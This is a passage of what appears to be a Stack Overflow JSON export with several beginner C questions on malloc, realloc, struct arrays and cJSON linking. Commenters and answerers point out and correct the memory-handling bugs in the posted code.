my_struct *p = malloc(sizeof *p + sizeof *(p-&gt;tab) * TBD);\n  assert(p);\n  p-&gt;columns = TBD;\n  p-&gt;rows = TBD;\n  for (int r = 0; r &lt; p-&gt;rows; r++) {\n    p-&gt;tab[r] = malloc(sizeof *(p-&gt;tab[r]) * TBD);\n    assert(p-&gt;tab[r]);\n    for (int c = 0; c &lt; p-&gt;columns; c++) {  // sample, fill array w/illustrative data\n      static int count = 0;\n      p-&gt;tab[r][c] = count++; // Access like a 2D array\n    }\n  }\n  return p;\n}\n\nvoid my_struct_print(struct my_struct *p) {\n  for (int r = 0; r &lt; p-&gt;rows; r++) {\n    for (int c = 0; c &lt; p-&gt;columns; c++) {\n      printf(\"%.0f \", p-&gt;tab[r][c]);  // Access like a 2D array\n    }\n    puts(\"\");\n  }\n}\n\nvoid my_struct_free(struct my_struct *p) {\n  if (p) {\n    for (int r = 0; r &lt; p-&gt;rows; r++) {\n      free(p-&gt;tab[r]);\n    }\n  }\n  free(p);\n}\n\nint main() {\n  struct my_struct *p = my_struct_alloc(2, 3);\n  my_struct_print(p);\n  my_struct_free(p);\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>0 1 \n2 3 \n4 5 \n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 6949663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70db60079949cf3637b797dc9acb84d3?s=128&d=identicon&r=PG&f=1", "display_name": "stefam mierz", "link": "https://stackoverflow.com/users/6949663/stefam-mierz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 351, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1498066560, "creation_date": 1498062614, "last_edit_date": 1498062996, "question_id": 44681592, "link": "https://stackoverflow.com/questions/44681592/2d-dynamic-array-in-structure", "title": "2d dynamic array in structure", "body": "<p>I'm learning for school and I found exam task:\n\"Create struct with fields:\n 2 integers, \n two-dimensional flexible array (double or float) \" </p>\n\n<p>I did something like that:</p>\n\n<pre><code>    struct my_struct{\n     int firstField;\n     int secondField;\n     int columns;\n     int rows;\n     double tab[columns][rows];\n}\n\nstruct my_struct sample = {2, 2, 5, 4, {0.0}}\n</code></pre>\n\n<p>But it does not work.How should I create struct like that?</p>\n"}, {"tags": ["c", "arrays", "malloc", "return-type"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498061104, "post_id": 44681067, "comment_id": 76346520, "body": "You cannot pass an array to/from a function. But you can pass a pointer. Read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and use the debugger."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1498061406, "post_id": 44681067, "comment_id": 76346708, "body": "Your code has many issues."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1498062364, "post_id": 44681067, "comment_id": 76347286, "body": "&quot;<i>for example of string type</i>&quot; there is not type &quot;string&quot; in C."}, {"owner": {"reputation": 109, "user_id": 3791382, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/af688d4448307a770093ecbe84713a18?s=128&d=identicon&r=PG&f=1", "display_name": "Curiosity", "link": "https://stackoverflow.com/users/3791382/curiosity"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498062439, "post_id": 44681067, "comment_id": 76347325, "body": "@Olaf in the code, i might have misnamed, but I think &quot;A&quot; is the pointer in &quot;array_return&quot; function."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498062564, "post_id": 44681067, "comment_id": 76347389, "body": "@Curiosity: In your title you want to return an array of &quot;strings&quot;. Which typically would be an array of arrays or an array of pointers. None of these is in your code. And we are not a debugging service."}, {"owner": {"reputation": 109, "user_id": 3791382, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/af688d4448307a770093ecbe84713a18?s=128&d=identicon&r=PG&f=1", "display_name": "Curiosity", "link": "https://stackoverflow.com/users/3791382/curiosity"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498063158, "post_id": 44681067, "comment_id": 76347673, "body": "@Olaf you have been veryy helpful. thank you!"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1498063467, "post_id": 44681067, "comment_id": 76347863, "body": "<a href=\"http://ideone.com/CmRP7y\" rel=\"nofollow noreferrer\">correction example</a>"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 2, "creation_date": 1498063699, "post_id": 44681067, "comment_id": 76348007, "body": "Referring this &quot;<i><code>sprintf(string,&quot;%s %i&quot;,string,k);</code></i>&quot;: From <code>man sprintf</code>: &quot;<b><i>DESCRIPTION</b> [...] C99 and POSIX.1-2001 specify that the results are undefined if a call to sprintf(), snprintf(), vsprintf(), or vsnprintf() would cause copying to take place between objects that  overlap  (e.g.,  if        the target string array and one of the supplied input arguments refer to the same buffer).</i>&quot;"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1498063879, "post_id": 44681067, "comment_id": 76348115, "body": "Take the compiler&#39;s warnings serious. Fix the code until no more warnings are issued. Do not blindly &quot;cast away&quot; warnings."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1498064020, "post_id": 44681067, "comment_id": 76348191, "body": "Also reading from where a <code>free()</code>ed pointer points to is not a good idea."}], "answers": [{"comments": [{"owner": {"reputation": 109, "user_id": 3791382, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/af688d4448307a770093ecbe84713a18?s=128&d=identicon&r=PG&f=1", "display_name": "Curiosity", "link": "https://stackoverflow.com/users/3791382/curiosity"}, "edited": false, "score": 0, "creation_date": 1498063081, "post_id": 44681535, "comment_id": 76347631, "body": "Thank you @Chris for your suggestions and clarification."}], "tags": [], "owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "is_accepted": false, "score": 3, "last_activity_date": 1498062460, "creation_date": 1498062460, "answer_id": 44681535, "question_id": 44681067, "link": "https://stackoverflow.com/questions/44681067/incompatible-pointer-to-integer-conversion-error/44681535#44681535", "title": "Incompatible pointer to integer conversion error", "body": "<p>So the problems with your code are many. The one related to your error message is due to the fact that <code>A[k]</code> isn't a string and you're trying to print it out as one.</p>\n\n<pre><code>printf(\"%s\\n\",A[k]);\n</code></pre>\n\n<p><code>A[k]</code> is the <code>k</code>th element of the memory pointed to by <code>A</code> and since <code>A</code> is declared as a <code>char *</code> that means that <code>A[k]</code> is of type <code>char</code>. To do what you're trying to do you want <code>A</code> to actually be declared as a <code>char **</code> like this.</p>\n\n<pre><code>char **A=malloc(sizeof(*A)*n); // We need n lots of what A points to\n</code></pre>\n\n<p>But your code still won't technically work because assigning <code>string</code> to <code>A[k]</code> just copies what <code>string</code> points to into each element of <code>A</code> so they'll all be the same. That is, until that function finishes and then you enter the realm of Undefined Behaviour as the memory used by <code>string</code> is no longer valid.</p>\n\n<p>So what you want to do is copy the string in <code>string</code> into a new string that is pointed to by <code>A[k]</code>. The easiest way to do this is by using <code>strdup</code> as that will allocate space for your string and copy it in one function call.</p>\n\n<pre><code>A[k]=strdup(string);\n</code></pre>\n\n<p>Alternatively, you could ditch <code>string</code> entirely and allocate memory for <code>A[k]</code> and build the string you want directly in to it.</p>\n"}], "owner": {"reputation": 109, "user_id": 3791382, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/af688d4448307a770093ecbe84713a18?s=128&d=identicon&r=PG&f=1", "display_name": "Curiosity", "link": "https://stackoverflow.com/users/3791382/curiosity"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1977, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1498077102, "creation_date": 1498060925, "last_edit_date": 1498077102, "question_id": 44681067, "link": "https://stackoverflow.com/questions/44681067/incompatible-pointer-to-integer-conversion-error", "title": "Incompatible pointer to integer conversion error", "body": "<p>I am trying to learn c where main function calls some other function returning an array (for example of string type). </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar* array_return(char* name);\n\nint main(){\n    char* name=\"orange\";\n    char* A;\n    A=array_return(name);\n    free(A);\n\n    printf(\"%s\\n\",\"Check stored values in A\");\n    int k,n;\n    n=10;\n    for (k=0; k &lt; n; k++) {\n        printf(\"%s\\n\",A[k]);\n    }\n\n    return 0;\n}\n\n\nchar* array_return(char* name){\n    int k,n;\n    n=10;\n    char* A=malloc(n);\n    char string[100];\n\n    printf(\"%s\\n\",\"Store values in A\");\n    for (k=0; k &lt; n; k++) {\n        strcpy(string,\"Numer of \");\n        strcat(string,name);\n        strcat(string,\" are: \");\n        sprintf(string,\"%s %i\",string,k);\n        A[k]=string;\n        printf(\"%s\\n\",A[k]);\n    }\n    printf(\"%s\\n\",\"--------------------------\");\n    return A;\n}\n</code></pre>\n\n<p>I am trying to store following values in array \"A\":</p>\n\n<pre><code>Numer of orange are:  0\nNumer of orange are:  1\nNumer of orange are:  2\nNumer of orange are:  3\nNumer of orange are:  4\nNumer of orange are:  5\nNumer of orange are:  6\nNumer of orange are:  7\nNumer of orange are:  8\nNumer of orange are:  9\n</code></pre>\n\n<p>However, I get some following warnings</p>\n\n<pre><code>warning: format specifies type 'char *' but the argument has type \n'char'\n\nincompatible pointer to integer conversion assigning to 'char'\n  from 'char [100]' [-Wint-conversion]\n</code></pre>\n\n<p>And, I get the following error when I run the program:</p>\n\n<pre><code>Segmentation fault: 11\n</code></pre>\n\n<p>I would be very thankful if someone can help me to debug this code. </p>\n"}, {"tags": ["c", "core", "dynamic-memory-allocation", "dump", "coredump"], "comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1498060869, "post_id": 44681002, "comment_id": 76346385, "body": "Where is it crashing? Run your code in a debugger and it&#39;ll show you what line it is happening on"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498060872, "post_id": 44681002, "comment_id": 76346386, "body": "You don&#39;t check if <code>malloc</code> &amp; friends are successful and wonder why your code crashes? Read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and provide all information. Learn to use the debugger."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 5, "creation_date": 1498061165, "post_id": 44681002, "comment_id": 76346549, "body": "<code>array = realloc(array, size);</code> --&gt; <code>array = realloc(array, size*sizeof(int)); </code>"}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 1, "creation_date": 1498063566, "post_id": 44681002, "comment_id": 76347926, "body": "And don&#39;t assign the result of <code>realloc()</code> before you know whether it succeeded!"}], "answers": [{"tags": [], "owner": {"reputation": 889, "user_id": 7946648, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Q2VPH.jpg?s=128&g=1", "display_name": "Karina Kozarova", "link": "https://stackoverflow.com/users/7946648/karina-kozarova"}, "is_accepted": true, "score": 0, "last_activity_date": 1498061476, "creation_date": 1498061476, "answer_id": 44681261, "question_id": 44681002, "link": "https://stackoverflow.com/questions/44681002/core-dump-when-creating-a-dynamic-sum-until-eof/44681261#44681261", "title": "Core dump when creating a dynamic sum until eof", "body": "<p>Fixed it! The realloc should have size*sizeof(int).</p>\n"}], "owner": {"reputation": 889, "user_id": 7946648, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Q2VPH.jpg?s=128&g=1", "display_name": "Karina Kozarova", "link": "https://stackoverflow.com/users/7946648/karina-kozarova"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 44681261, "answer_count": 1, "score": 0, "last_activity_date": 1498063890, "creation_date": 1498060705, "last_edit_date": 1498063890, "question_id": 44681002, "link": "https://stackoverflow.com/questions/44681002/core-dump-when-creating-a-dynamic-sum-until-eof", "title": "Core dump when creating a dynamic sum until eof", "body": "<p>The following code has a flaw somewhere and when reaching the 11/12/13 number entering, I get an <strong>Aborted(core dumped)</strong> alert. What is wrong?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(){\n    // sum nums until EOF\n    int* array; // pointer to the first element\n    int size = 10; // memory for 10 elements\n    int i = 0, sum = 0;\n    array = malloc(sizeof(int)*10); //get memory\n    while(scanf(\"%d\",(array + i))!= EOF){   //read until EOF\n        //add element to the sum\n        sum += *(array+i);\n\n        //realloc memory\n        if(i == size-1){\n            size *= 2;          \n            array = realloc(array, size);   \n        }\n        i++;\n    }\n    free(array);        //free the memory\n    printf(\"%d\\n\\n\",sum);   //print sum\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "cjson", "cbor"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1498060153, "post_id": 44680713, "comment_id": 76345888, "body": "It&#39;s unclear what exactly you did to add cJSON to your project, but it was incomplete.  Programs that use cJSON will need to link in that library as well (maybe by passing <code>-lcjson</code> to the link command).  It may be that you&#39;ll need to <i>build</i> that library first.  If it&#39;s not installed in the default library search path, then you&#39;ll also need to use an <code>-L</code> option to tell the linker where to find it."}, {"owner": {"reputation": 11, "user_id": 8189189, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211529627910184/picture?type=large", "display_name": "Greta Romagnoli", "link": "https://stackoverflow.com/users/8189189/greta-romagnoli"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1498064263, "post_id": 44680713, "comment_id": 76348301, "body": "thank you! the library was imported and built correctly. I try to compile with cc cjson2cbor.c -lcbor -lcjson  -o cjson2cbor and it works!  :)"}], "answers": [{"tags": [], "owner": {"reputation": 9576, "user_id": 8388, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7274ab8bec883e16147dba44e10817c?s=128&d=identicon&r=PG", "display_name": "Joe Hildebrand", "link": "https://stackoverflow.com/users/8388/joe-hildebrand"}, "is_accepted": false, "score": 0, "last_activity_date": 1601560451, "creation_date": 1601560451, "answer_id": 64156868, "question_id": 44680713, "link": "https://stackoverflow.com/questions/44680713/cjson-symbols-not-found-for-architecture-x86-64/64156868#64156868", "title": "cjson - symbol(s) not found for architecture x86_64", "body": "<p>Adding the answer @John-Bollinger provided as a community wiki, so this doesn't show up unanswered.</p>\n<p>Pass <code>-lcjson</code> in to the link command.</p>\n"}], "owner": {"reputation": 11, "user_id": 8189189, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211529627910184/picture?type=large", "display_name": "Greta Romagnoli", "link": "https://stackoverflow.com/users/8189189/greta-romagnoli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 327, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1601560451, "creation_date": 1498059850, "question_id": 44680713, "link": "https://stackoverflow.com/questions/44680713/cjson-symbols-not-found-for-architecture-x86-64", "title": "cjson - symbol(s) not found for architecture x86_64", "body": "<p>I'm testing the library libcbor-0.5.0 for parsing and generating CBOR, <a href=\"https://libcbor.readthedocs.io/en/v0.5.0/index.html\" rel=\"nofollow noreferrer\">https://libcbor.readthedocs.io/en/v0.5.0/index.html</a>. All the examples run correctly, except cjson2cbor.c. \nIt requires cJSON.h, so I added <a href=\"https://github.com/DaveGamble/cJSON\" rel=\"nofollow noreferrer\">https://github.com/DaveGamble/cJSON</a> to my project. </p>\n\n<p>source code:</p>\n\n<pre><code>void cjson_cbor_stream_decode(cJSON * source,\n                              const struct cbor_callbacks *callbacks,\n                              void * context)\n{\n    switch (source-&gt;type) {\n\n[...]\n\ncase cJSON_Array:\n        {\n            callbacks-&gt;array_start(context, cJSON_GetArraySize(source));\n            cJSON *item = source-&gt;child;\n            while (item != NULL) {\n                cjson_cbor_stream_decode(item, callbacks, context);\n                item = item-&gt;next;\n            }\n            return;\n        }\n        case cJSON_Object:\n        {\n            callbacks-&gt;map_start(context, cJSON_GetArraySize(source));\n            cJSON *item = source-&gt;child;\n            while (item != NULL) {\n                callbacks-&gt;string(context, (unsigned char *) item-&gt;string, strlen(item-&gt;string));\n                cjson_cbor_stream_decode(item, callbacks, context);\n                item = item-&gt;next;\n            }\n            return;\n        }\n[...]\n\n}\n</code></pre>\n\n<p>...</p>\n\n<pre><code>JSON * json = cJSON_Parse(json_buffer);\ncJSON_Delete(json);\n</code></pre>\n\n<p>If I compile\ncc cjson2cbor.c -lcbor -o cjson2cbor</p>\n\n<p>it returns this error:</p>\n\n<pre><code>Undefined symbols for architecture x86_64:\n  \"_cJSON_Delete\", referenced from:\n      _main in cjson2cbor-d7a32c.o\n  \"_cJSON_GetArraySize\", referenced from:\n      _cjson_cbor_stream_decode in cjson2cbor-d7a32c.o\n  \"_cJSON_Parse\", referenced from:\n      _main in cjson2cbor-d7a32c.o\nld: symbol(s) not found for architecture x86_64\nclang: error: linker command failed with exit code 1 (use -v to see invocation)\n</code></pre>\n"}, {"tags": ["c", "linux", "struct", "malloc", "realloc"], "comments": [{"owner": {"reputation": 326, "user_id": 6111040, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-3u06-707SdU/AAAAAAAAAAI/AAAAAAAAGtk/FOCLaeW94dY/photo.jpg?sz=128", "display_name": "MIG-23", "link": "https://stackoverflow.com/users/6111040/mig-23"}, "edited": false, "score": 1, "creation_date": 1498059020, "post_id": 44680251, "comment_id": 76345063, "body": "ipHeadr = malloc(sizeof(ipHeadr)); -&gt; no * in the malloc"}, {"owner": {"reputation": 4259, "user_id": 2516916, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/90d670e62ae35e180ad6e939443cab62?s=128&d=identicon&r=PG", "display_name": "Gillespie", "link": "https://stackoverflow.com/users/2516916/gillespie"}, "edited": false, "score": 0, "creation_date": 1498059130, "post_id": 44680251, "comment_id": 76345150, "body": "You are only <code>malloc</code>ing the size of one pointer. You need to <code>malloc</code> the size of the entire struct"}, {"owner": {"reputation": 111, "user_id": 8140723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/25Xcg.png?s=128&g=1", "display_name": "Matthew Darens", "link": "https://stackoverflow.com/users/8140723/matthew-darens"}, "edited": false, "score": 0, "creation_date": 1498059326, "post_id": 44680251, "comment_id": 76345270, "body": "Thank you, I&#39;ll remove *. How can I malloc the entire struct?(sorry if the question is dumb)"}, {"owner": {"reputation": 111, "user_id": 8140723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/25Xcg.png?s=128&g=1", "display_name": "Matthew Darens", "link": "https://stackoverflow.com/users/8140723/matthew-darens"}, "edited": false, "score": 0, "creation_date": 1498059568, "post_id": 44680251, "comment_id": 76345441, "body": "So I don&#39;t need to correct my malloc, right?"}, {"owner": {"reputation": 111, "user_id": 8140723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/25Xcg.png?s=128&g=1", "display_name": "Matthew Darens", "link": "https://stackoverflow.com/users/8140723/matthew-darens"}, "edited": false, "score": 0, "creation_date": 1498059948, "post_id": 44680251, "comment_id": 76345737, "body": "Ok, I&#39;ll try, thank you, but can you help me to get the output? And also wich type of temp pointer can I use? Should I create it with the same struct or can use like &quot;int *temp&quot;?"}, {"owner": {"reputation": 111, "user_id": 8140723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/25Xcg.png?s=128&g=1", "display_name": "Matthew Darens", "link": "https://stackoverflow.com/users/8140723/matthew-darens"}, "edited": false, "score": 0, "creation_date": 1498060290, "post_id": 44680251, "comment_id": 76346006, "body": "Oh, sorry for this, my bad, they are not related, these are the same kind of structs, I have put the wrong part of code, I have corrected the code."}, {"owner": {"reputation": 111, "user_id": 8140723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/25Xcg.png?s=128&g=1", "display_name": "Matthew Darens", "link": "https://stackoverflow.com/users/8140723/matthew-darens"}, "edited": false, "score": 0, "creation_date": 1498061655, "post_id": 44680251, "comment_id": 76346847, "body": "I have tried to get it like this: &quot;for (int ip = 0; ip &lt; packetNum; ip++) {         printf(&quot;%u\\n&quot;, ipHeadr[ip].ipVer);         printf(&quot;%u\\n&quot;, ipHeadr[ip].headerDWORDS);&quot;, but it gives me wrong or corrupted data, the normal data I get only if I&#39;m writing: printf(&quot;%u\\n&quot;, ipHeadr-&gt;ipVer);"}, {"owner": {"reputation": 111, "user_id": 8140723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/25Xcg.png?s=128&g=1", "display_name": "Matthew Darens", "link": "https://stackoverflow.com/users/8140723/matthew-darens"}, "edited": false, "score": 0, "creation_date": 1498064583, "post_id": 44680251, "comment_id": 76348479, "body": "Oh, thank you, I&#39;m idiot, I should enter data by this way too."}], "owner": {"reputation": 111, "user_id": 8140723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/25Xcg.png?s=128&g=1", "display_name": "Matthew Darens", "link": "https://stackoverflow.com/users/8140723/matthew-darens"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 41, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1498060358, "creation_date": 1498058611, "last_edit_date": 1498060358, "question_id": 44680251, "link": "https://stackoverflow.com/questions/44680251/output-struct-data-from-allocated-memory", "title": "Output struct data from allocated memory", "body": "<p>I have a question, I have created a struct:</p>\n\n<pre><code>struct ipOut {\n    unsigned int ipVer;\n    unsigned int headerDWORDS;\n    unsigned int headerBytes;\n    unsigned int typeOfService;\n    unsigned int ipLength;\n    unsigned int ident;\n    unsigned int ttl;\n    unsigned int protocolNum;\n    unsigned int checkSum;\n    unsigned int protocol;\n};\n</code></pre>\n\n<p>I allocated memory for it:</p>\n\n<pre><code>struct ipOut *ipHeadr = NULL;\nipHeadr = malloc(sizeof(*ipHeadr));//this one is inside main\n</code></pre>\n\n<p>Then, each time I'm getting data I reallocating memory and entering data to the strcut:</p>\n\n<pre><code>packetNum++;\nipHeadr = realloc(ipHeadr, sizeof(*ipHeadr)*packetNum);\nipHeadr-&gt;ipVer = iph-&gt;version;\nipHeadr-&gt;headerDWORDS = (unsigned int)iph-&gt;ihl;\nipHeadr-&gt;headerBytes = (unsigned int)iph-&gt;ihl*4;\nipHeadr-&gt;typeOfService = (unsigned int)iph-&gt;tos;\nipHeadr-&gt;ipLength = ntohs(iph-&gt;tot_len);\nipHeadr-&gt;ident =  ntohs(iph-&gt;id);\nipHeadr-&gt;ttl = (unsigned int)iph-&gt;ttl;\nipHeadr-&gt;protocolNum = (unsigned int)iph-&gt;protocol;\nipHeadr-&gt;checkSum = ntohs(iph-&gt;check);\nipHeadr-&gt;protocol =iph -&gt; protocol;\n</code></pre>\n\n<p>So I tried to get this data chunk by chunk (where chunk the size of strcut), or any other way (also the way most tutorials using for malloc, like creating an array from pointer), but every time I'm trying to print it, I'm getting the same chunk many times, without changes. I cant put the code of my output, because I tried lot of different ways and don't know what to show. Also the quiestion is - how can I print the data in this way, chunk by chunk.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 22777, "user_id": 133203, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Fp3hB.jpg?s=128&g=1", "display_name": "Federico klez Culloca", "link": "https://stackoverflow.com/users/133203/federico-klez-culloca"}, "edited": false, "score": 2, "creation_date": 1498058706, "post_id": 44680242, "comment_id": 76344837, "body": "you&#39;re doing integer division with numbers that end being between 0 and 1 (like <code>(1 &#47; PULSE_FREQ)</code>), so integer division threats them as 0."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498058798, "post_id": 44680242, "comment_id": 76344900, "body": "Macros are not constants!"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498059061, "post_id": 44680242, "comment_id": 76345088, "body": "The math equivalent <code>Target_Count = (Timer_Frequency  &#47; Target_Frequency) - 1</code> would work better.  (some rounding issues remain)"}], "answers": [{"comments": [{"owner": {"reputation": 22777, "user_id": 133203, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Fp3hB.jpg?s=128&g=1", "display_name": "Federico klez Culloca", "link": "https://stackoverflow.com/users/133203/federico-klez-culloca"}, "edited": false, "score": 1, "creation_date": 1498058780, "post_id": 44680304, "comment_id": 76344887, "body": "&quot;less than 0&quot; did you mean less than 1?"}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "reply_to_user": {"reputation": 22777, "user_id": 133203, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Fp3hB.jpg?s=128&g=1", "display_name": "Federico klez Culloca", "link": "https://stackoverflow.com/users/133203/federico-klez-culloca"}, "edited": false, "score": 0, "creation_date": 1498058861, "post_id": 44680304, "comment_id": 76344946, "body": "@FedericoklezCulloca Whoops, corrected. Thanks."}], "tags": [], "owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "is_accepted": true, "score": 1, "last_activity_date": 1498059951, "last_edit_date": 1498059951, "creation_date": 1498058736, "answer_id": 44680304, "question_id": 44680242, "link": 